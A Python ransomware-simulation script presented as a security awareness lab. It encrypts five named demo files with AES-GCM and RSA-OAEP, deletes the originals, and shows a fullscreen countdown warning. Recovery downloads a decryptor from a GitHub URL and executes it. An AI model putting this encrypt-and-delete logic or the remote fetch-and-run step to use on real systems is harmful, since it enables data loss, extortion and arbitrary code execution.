from pathlib import Path
from datetime import datetime, timedelta
import hashlib
import json
import os
import shutil
import subprocess
import sys
import tkinter as tk
import time

from urllib.request import Request, urlopen

from Cryptodome.Cipher import AES, PKCS1_OAEP
from Cryptodome.PublicKey import RSA
from Cryptodome.Hash import SHA256
from Cryptodome.Random import get_random_bytes


# ============================================================
# CONTROLLED RANSOMWARE AWARENESS LAB
#
# IMPORTANT:
# This demo ONLY processes these five explicitly listed files
# inside:
#
# ~/Desktop/RansomDemo/targets/
#
# No recursive filesystem scanning is performed.
# ============================================================


ROOT = (
    Path.home()
    / "Desktop"
    / "RansomDemo"
)

TARGET_DIR = (
    ROOT
    / "targets"
)

BACKUP_DIR = (
    ROOT
    / ".safety_backup"
)

RUNTIME_DIR = (
    ROOT
    / ".runtime"
)

LOG_FILE = (
    ROOT
    / "demo_log.txt"
)

CHECKSUM_FILE = (
    ROOT
    / "checksums.json"
)

PRIVATE_KEY_FILE = (
    RUNTIME_DIR
    / "private.pem"
)

PUBLIC_KEY_FILE = (
    RUNTIME_DIR
    / "public.pem"
)

DECRYPTOR_FILE = (
    RUNTIME_DIR
    / "demo_decrypt.py"
)


# ============================================================
# GITHUB URLS
# ============================================================

DECRYPTOR_URL = (
    "https://raw.githubusercontent.com/"
    "what0302/what0302.github.io/"
    "master/_posts/demo_decrypt.py"
)

RECOVERY_CODE_URL = (
    "https://raw.githubusercontent.com/"
    "what0302/what0302.github.io/"
    "master/_posts/recovery_code.txt"
)


# ============================================================
# DEMO TARGET FILES
# ============================================================

TARGET_FILES = [
    "personal_notes.txt",
    "employees.csv",
    "config.json",
    "project_plan.md",
    "application.log",
]


MAGIC = b"UNTDEMO1"

COUNTDOWN_MINUTES = 30


# ============================================================
# LOGGING
# ============================================================

def write_log(message):

    ROOT.mkdir(
        parents=True,
        exist_ok=True
    )

    timestamp = datetime.now().strftime(
        "%Y-%m-%d %H:%M:%S"
    )

    line = (
        f"{timestamp} "
        f"{message}"
    )

    print(line)

    with LOG_FILE.open(
        "a",
        encoding="utf-8"
    ) as file:

        file.write(
            line + "\n"
        )


# ============================================================
# SHA-256
# ============================================================

def sha256_file(path):

    digest = hashlib.sha256()

    with path.open(
        "rb"
    ) as file:

        while True:

            chunk = file.read(
                1024 * 1024
            )

            if not chunk:
                break

            digest.update(
                chunk
            )

    return digest.hexdigest()


# ============================================================
# DIRECTORIES
# ============================================================

def setup():

    TARGET_DIR.mkdir(
        parents=True,
        exist_ok=True
    )

    BACKUP_DIR.mkdir(
        parents=True,
        exist_ok=True
    )

    RUNTIME_DIR.mkdir(
        parents=True,
        exist_ok=True
    )


# ============================================================
# RSA KEYS
# ============================================================

def generate_keys():

    if PRIVATE_KEY_FILE.exists():

        private_key = RSA.import_key(
            PRIVATE_KEY_FILE.read_bytes()
        )

        if not PUBLIC_KEY_FILE.exists():

            PUBLIC_KEY_FILE.write_bytes(
                private_key
                .publickey()
                .export_key()
            )

        write_log(
            "[KEY] Existing RSA key pair loaded"
        )

        return


    write_log(
        "[KEY] Generating RSA-2048 training key pair"
    )


    key = RSA.generate(
        2048
    )


    PRIVATE_KEY_FILE.write_bytes(
        key.export_key()
    )


    PUBLIC_KEY_FILE.write_bytes(
        key
        .publickey()
        .export_key()
    )


    try:

        os.chmod(
            PRIVATE_KEY_FILE,
            0o600
        )

    except OSError:

        pass


    write_log(
        "[KEY] RSA key pair generated"
    )


# ============================================================
# ORIGINAL SHA-256 BASELINE
# ============================================================

def save_original_checksums():

    checksums = {}


    for filename in TARGET_FILES:

        path = (
            TARGET_DIR
            / filename
        )


        if not path.exists():

            write_log(
                "[HASH-ERROR] "
                f"Missing source file: {filename}"
            )

            continue


        if path.is_symlink():

            write_log(
                "[HASH-ERROR] "
                f"Symlink rejected: {filename}"
            )

            continue


        digest = sha256_file(
            path
        )


        checksums[
            filename
        ] = digest


        write_log(
            "[HASH-BEFORE] "
            f"{filename} "
            f"{digest}"
        )


    CHECKSUM_FILE.write_text(
        json.dumps(
            checksums,
            indent=2
        ),
        encoding="utf-8"
    )


    write_log(
        "[HASH] "
        "SHA-256 baseline saved"
    )


# ============================================================
# ENCRYPT ONE FILE
# ============================================================

def encrypt_file(filename):

    source = (
        TARGET_DIR
        / filename
    )

    encrypted = (
        TARGET_DIR
        / (filename + ".unt")
    )

    backup = (
        BACKUP_DIR
        / filename
    )

    temporary = (
        TARGET_DIR
        / (filename + ".unt.tmp")
    )


    # --------------------------------------------------------
    # SAFETY CHECKS
    # --------------------------------------------------------

    if source.is_symlink():

        write_log(
            "[SKIP] "
            f"Symlink rejected: {filename}"
        )

        return False


    if not source.exists():

        if encrypted.exists():

            write_log(
                "[INFO] "
                f"Already encrypted: {filename}"
            )

            return True


        write_log(
            "[ERROR] "
            f"Source file missing: {filename}"
        )

        return False


    if encrypted.exists():

        write_log(
            "[ERROR] "
            f"Both original and encrypted file exist: "
            f"{filename}"
        )

        return False


    # --------------------------------------------------------
    # SAFETY BACKUP
    # --------------------------------------------------------

    if not backup.exists():

        shutil.copy2(
            source,
            backup
        )


        write_log(
            "[BACKUP] "
            f"{filename}"
        )


    # --------------------------------------------------------
    # READ PLAINTEXT
    # --------------------------------------------------------

    plaintext = (
        source.read_bytes()
    )


    # --------------------------------------------------------
    # LOAD RSA PUBLIC KEY
    # --------------------------------------------------------

    public_key = RSA.import_key(
        PUBLIC_KEY_FILE.read_bytes()
    )


    # --------------------------------------------------------
    # RANDOM AES-256 KEY
    # --------------------------------------------------------

    aes_key = get_random_bytes(
        32
    )


    # --------------------------------------------------------
    # AES-256-GCM
    # --------------------------------------------------------

    aes_cipher = AES.new(
        aes_key,
        AES.MODE_GCM
    )


    ciphertext, tag = (
        aes_cipher.encrypt_and_digest(
            plaintext
        )
    )


    # --------------------------------------------------------
    # RSA-OAEP WRAP AES KEY
    # --------------------------------------------------------

    rsa_cipher = PKCS1_OAEP.new(
        public_key,
        hashAlgo=SHA256
    )


    encrypted_aes_key = (
        rsa_cipher.encrypt(
            aes_key
        )
    )


    try:

        # ----------------------------------------------------
        # BUILD .UNT FILE
        # ----------------------------------------------------

        with temporary.open(
            "wb"
        ) as file:


            # MAGIC HEADER
            file.write(
                MAGIC
            )


            # ENCRYPTED AES KEY LENGTH
            file.write(
                len(
                    encrypted_aes_key
                ).to_bytes(
                    2,
                    "big"
                )
            )


            # ENCRYPTED AES KEY
            file.write(
                encrypted_aes_key
            )


            # NONCE LENGTH
            file.write(
                len(
                    aes_cipher.nonce
                ).to_bytes(
                    1,
                    "big"
                )
            )


            # NONCE
            file.write(
                aes_cipher.nonce
            )


            # TAG LENGTH
            file.write(
                len(
                    tag
                ).to_bytes(
                    1,
                    "big"
                )
            )


            # TAG
            file.write(
                tag
            )


            # CIPHERTEXT
            file.write(
                ciphertext
            )


        # ----------------------------------------------------
        # ATOMIC FINALIZE
        # ----------------------------------------------------

        os.replace(
            temporary,
            encrypted
        )


        # ----------------------------------------------------
        # PLAINTEXT REMOVED ONLY AFTER .UNT CREATED
        # ----------------------------------------------------

        source.unlink()


        write_log(
            "[ENCRYPTED] "
            f"{filename} -> "
            f"{filename}.unt"
        )


        return True


    except Exception as error:


        if temporary.exists():

            temporary.unlink()


        write_log(
            "[ENCRYPT-FAILED] "
            f"{filename}: "
            f"{error}"
        )


        return False


# ============================================================
# ENCRYPT ALL FIVE FILES
# ============================================================

def encrypt_all():

    successful = 0


    for filename in TARGET_FILES:

        if encrypt_file(
            filename
        ):

            successful += 1


    return successful


# ============================================================
# VERIFY ENCRYPTED STATE
# ============================================================

def verify_encrypted_state():

    for filename in TARGET_FILES:

        original = (
            TARGET_DIR
            / filename
        )

        encrypted = (
            TARGET_DIR
            / (filename + ".unt")
        )


        if original.exists():

            write_log(
                "[VERIFY-ERROR] "
                f"Plaintext remains: {filename}"
            )

            return False


        if not encrypted.exists():

            write_log(
                "[VERIFY-ERROR] "
                f"Encrypted file missing: "
                f"{filename}.unt"
            )

            return False


    write_log(
        "[VERIFY] "
        "All 5 training files encrypted"
    )


    return True


# ============================================================
# REMOTE RECOVERY CODE
# ============================================================

def get_remote_recovery_code():

    # Timestamp is appended to reduce the chance
    # of receiving a cached older value.

    url = (
        RECOVERY_CODE_URL
        + "?t="
        + str(
            int(
                time.time()
            )
        )
    )


    request = Request(
        url,
        headers={
            "User-Agent":
                "Security-Awareness-Lab/1.0",

            "Cache-Control":
                "no-cache",

            "Pragma":
                "no-cache",
        }
    )


    with urlopen(
        request,
        timeout=10
    ) as response:

        raw = response.read()


    code = (
        raw
        .decode(
            "utf-8"
        )
        .strip()
    )


    if not code:

        raise RuntimeError(
            "Remote recovery code is empty"
        )


    # Basic sanity limit for the training code.
    if len(code) > 64:

        raise RuntimeError(
            "Remote recovery code is invalid"
        )


    write_log(
        "[RECOVERY] "
        "Remote recovery code retrieved"
    )


    return code


# ============================================================
# DOWNLOAD DECRYPTOR
# ============================================================

def download_decryptor():

    write_log(
        "[RECOVERY] "
        "Downloading recovery utility"
    )


    # Cache-busting timestamp
    url = (
        DECRYPTOR_URL
        + "?t="
        + str(
            int(
                time.time()
            )
        )
    )


    request = Request(
        url,
        headers={
            "User-Agent":
                "Security-Awareness-Lab/1.0",

            "Cache-Control":
                "no-cache",

            "Pragma":
                "no-cache",
        }
    )


    with urlopen(
        request,
        timeout=15
    ) as response:

        data = response.read()


    if len(data) < 100:

        raise RuntimeError(
            "Downloaded recovery utility "
            "is unexpectedly small"
        )


    temporary = (
        RUNTIME_DIR
        / "demo_decrypt.py.tmp"
    )


    temporary.write_bytes(
        data
    )


    os.replace(
        temporary,
        DECRYPTOR_FILE
    )


    write_log(
        "[RECOVERY] "
        "Recovery utility downloaded"
    )


# ============================================================
# WARNING GUI
# ============================================================

def show_warning_window():

    root = tk.Tk()


    root.title(
        "Security Awareness Training"
    )


    root.configure(
        bg="#8b0000"
    )


    root.attributes(
        "-fullscreen",
        True
    )


    root.attributes(
        "-topmost",
        True
    )


    # Safety exit for training.
    root.bind(
        "<Escape>",
        lambda event:
            root.destroy()
    )


    end_time = (
        datetime.now()
        + timedelta(
            minutes=COUNTDOWN_MINUTES
        )
    )


    # ========================================================
    # HEADER
    # ========================================================

    header = tk.Label(
        root,
        text=(
            "SECURITY AWARENESS TRAINING"
        ),
        font=(
            "Arial",
            30,
            "bold"
        ),
        fg="white",
        bg="#8b0000"
    )


    header.pack(
        pady=(30, 4)
    )


    simulation_label = tk.Label(
        root,
        text=(
            "CONTROLLED RANSOMWARE SIMULATION"
        ),
        font=(
            "Arial",
            17,
            "bold"
        ),
        fg="yellow",
        bg="#8b0000"
    )


    simulation_label.pack(
        pady=4
    )


    title = tk.Label(
        root,
        text=(
            "YOUR DEMO FILES "
            "HAVE BEEN ENCRYPTED"
        ),
        font=(
            "Arial",
            34,
            "bold"
        ),
        fg="white",
        bg="#8b0000"
    )


    title.pack(
        pady=(20, 12)
    )


    info = tk.Label(
        root,
        text=(
            "5 / 5 training files encrypted\n\n"
            "Encryption: AES-256-GCM\n"
            "Key protection: RSA-2048 OAEP\n\n"
            "Only files inside the controlled "
            "RansomDemo training directory "
            "were processed."
        ),
        font=(
            "Arial",
            15
        ),
        fg="white",
        bg="#8b0000",
        justify="center"
    )


    info.pack(
        pady=8
    )


    # ========================================================
    # TIMER
    # ========================================================

    timer_title = tk.Label(
        root,
        text="TRAINING COUNTDOWN",
        font=(
            "Arial",
            14,
            "bold"
        ),
        fg="white",
        bg="#8b0000"
    )


    timer_title.pack(
        pady=(8, 0)
    )


    timer_label = tk.Label(
        root,
        text="00:30:00",
        font=(
            "Courier",
            42,
            "bold"
        ),
        fg="yellow",
        bg="#8b0000"
    )


    timer_label.pack(
        pady=3
    )


    # ========================================================
    # VIEW ENCRYPTED FILES
    # ========================================================

    def view_files():

        write_log(
            "[GUI] "
            "Encrypted files directory opened"
        )


        # Temporarily stop forcing this window
        # above the file manager.
        root.attributes(
            "-topmost",
            False
        )


        try:

            subprocess.Popen(
                [
                    "xdg-open",
                    str(
                        TARGET_DIR
                    )
                ]
            )

        except Exception as error:

            write_log(
                "[GUI-ERROR] "
                f"{error}"
            )


    view_button = tk.Button(
        root,
        text=(
            "VIEW ENCRYPTED FILES"
        ),
        font=(
            "Arial",
            14,
            "bold"
        ),
        command=view_files,
        padx=20,
        pady=6
    )


    view_button.pack(
        pady=8
    )


    # ========================================================
    # RECOVERY CODE INPUT
    # ========================================================

    code_label = tk.Label(
        root,
        text="RECOVERY CODE",
        font=(
            "Arial",
            14,
            "bold"
        ),
        fg="white",
        bg="#8b0000"
    )


    code_label.pack(
        pady=(5, 3)
    )


    code_entry = tk.Entry(
        root,
        font=(
            "Arial",
            20
        ),
        width=18,
        justify="center",
        show="*"
    )


    code_entry.pack(
        pady=4
    )


    code_entry.focus_set()


    status_label = tk.Label(
        root,
        text="",
        font=(
            "Arial",
            13,
            "bold"
        ),
        fg="yellow",
        bg="#8b0000"
    )


    status_label.pack(
        pady=6
    )


    # ========================================================
    # RECOVERY PROCESS
    # ========================================================

    def recover():

        entered_code = (
            code_entry
            .get()
            .strip()
        )


        if not entered_code:

            status_label.config(
                text=(
                    "ENTER A RECOVERY CODE"
                )
            )

            return


        status_label.config(
            text=(
                "VALIDATING RECOVERY CODE..."
            )
        )


        root.update_idletasks()


        write_log(
            "[RECOVERY] "
            "Recovery code validation requested"
        )


        # ----------------------------------------------------
        # FETCH CURRENT CODE FROM GITHUB
        # ----------------------------------------------------

        try:

            remote_code = (
                get_remote_recovery_code()
            )

        except Exception as error:

            write_log(
                "[RECOVERY-ERROR] "
                "Unable to retrieve remote code: "
                f"{error}"
            )


            status_label.config(
                text=(
                    "UNABLE TO CONTACT "
                    "RECOVERY SERVER"
                )
            )

            return


        # ----------------------------------------------------
        # COMPARE ENTERED VS REMOTE
        # ----------------------------------------------------

        if entered_code != remote_code:

            write_log(
                "[RECOVERY] "
                "Invalid recovery code entered"
            )


            status_label.config(
                text=(
                    "INVALID RECOVERY CODE"
                )
            )


            code_entry.delete(
                0,
                tk.END
            )


            return


        # ----------------------------------------------------
        # CODE MATCHED
        # ----------------------------------------------------

        write_log(
            "[RECOVERY] "
            "Remote recovery code validated"
        )


        status_label.config(
            text=(
                "RECOVERY CODE ACCEPTED"
            )
        )


        root.update_idletasks()


        # ----------------------------------------------------
        # DOWNLOAD AND START DECRYPTOR
        # ----------------------------------------------------

        try:

            status_label.config(
                text=(
                    "DOWNLOADING "
                    "RECOVERY UTILITY..."
                )
            )


            root.update_idletasks()


            download_decryptor()


            status_label.config(
                text=(
                    "STARTING FILE RECOVERY..."
                )
            )


            root.update_idletasks()


            subprocess.Popen(
                [
                    sys.executable,
                    str(
                        DECRYPTOR_FILE
                    )
                ]
            )


            write_log(
                "[RECOVERY] "
                "Recovery utility launched"
            )


            # Close warning GUI.
            root.destroy()


        except Exception as error:

            write_log(
                "[RECOVERY-ERROR] "
                f"{error}"
            )


            status_label.config(
                text=(
                    "RECOVERY FAILED: "
                    + str(error)
                )
            )


    recover_button = tk.Button(
        root,
        text="RECOVER FILES",
        font=(
            "Arial",
            16,
            "bold"
        ),
        command=recover,
        padx=25,
        pady=7
    )


    recover_button.pack(
        pady=7
    )


    code_entry.bind(
        "<Return>",
        lambda event:
            recover()
    )


    # ========================================================
    # FOOTER
    # ========================================================

    footer = tk.Label(
        root,
        text=(
            "SIMULATION ONLY  •  "
            "~/Desktop/RansomDemo/targets  •  "
            "ESC = Emergency Exit"
        ),
        font=(
            "Arial",
            11
        ),
        fg="white",
        bg="#8b0000"
    )


    footer.pack(
        side="bottom",
        pady=12
    )


    # ========================================================
    # COUNTDOWN
    # ========================================================

    def update_timer():

        remaining = (
            end_time
            - datetime.now()
        )


        seconds = max(
            0,
            int(
                remaining.total_seconds()
            )
        )


        hours = (
            seconds // 3600
        )


        minutes = (
            seconds % 3600
        ) // 60


        seconds_remaining = (
            seconds % 60
        )


        timer_label.config(
            text=(
                f"{hours:02d}:"
                f"{minutes:02d}:"
                f"{seconds_remaining:02d}"
            )
        )


        if seconds > 0:

            root.after(
                1000,
                update_timer
            )

        else:

            status_label.config(
                text=(
                    "TRAINING TIMER EXPIRED"
                )
            )


            write_log(
                "[GUI] "
                "Training countdown expired"
            )


    update_timer()


    write_log(
        "[GUI] "
        "Warning screen displayed"
    )


    root.mainloop()


# ============================================================
# MAIN
# ============================================================

def main():

    setup()


    write_log(
        "=================================================="
    )


    write_log(
        "[START] "
        "Ransomware awareness simulation started"
    )


    # --------------------------------------------------------
    # MAKE SURE ALL 5 SOURCE FILES EXIST BEFORE STARTING
    # --------------------------------------------------------

    missing = []


    for filename in TARGET_FILES:

        path = (
            TARGET_DIR
            / filename
        )

        encrypted = (
            TARGET_DIR
            / (filename + ".unt")
        )


        if (
            not path.exists()
            and
            not encrypted.exists()
        ):

            missing.append(
                filename
            )


    if missing:

        write_log(
            "[ABORT] "
            "Required training files are missing: "
            + ", ".join(
                missing
            )
        )


        print()

        print(
            "Required demo files are missing:"
        )


        for filename in missing:

            print(
                f" - {filename}"
            )


        return


    # --------------------------------------------------------
    # GENERATE / LOAD RSA
    # --------------------------------------------------------

    generate_keys()


    # --------------------------------------------------------
    # SAVE HASHES ONLY WHEN PLAINTEXT FILES ARE PRESENT
    # --------------------------------------------------------

    plaintext_count = sum(
        1
        for filename in TARGET_FILES
        if (
            TARGET_DIR
            / filename
        ).exists()
    )


    if plaintext_count > 0:

        save_original_checksums()


    # --------------------------------------------------------
    # ENCRYPT
    # --------------------------------------------------------

    successful = (
        encrypt_all()
    )


    write_log(
        "[STATUS] "
        f"Encryption status: "
        f"{successful}/"
        f"{len(TARGET_FILES)}"
    )


    # --------------------------------------------------------
    # VERIFY
    # --------------------------------------------------------

    if not verify_encrypted_state():

        write_log(
            "[ABORT] "
            "Encrypted state verification failed"
        )


        print()

        print(
            "Not all training files "
            "are encrypted."
        )


        print(
            "Warning GUI will not "
            "be displayed."
        )


        return


    # --------------------------------------------------------
    # GUI
    # --------------------------------------------------------

    show_warning_window()


if __name__ == "__main__":

    main()
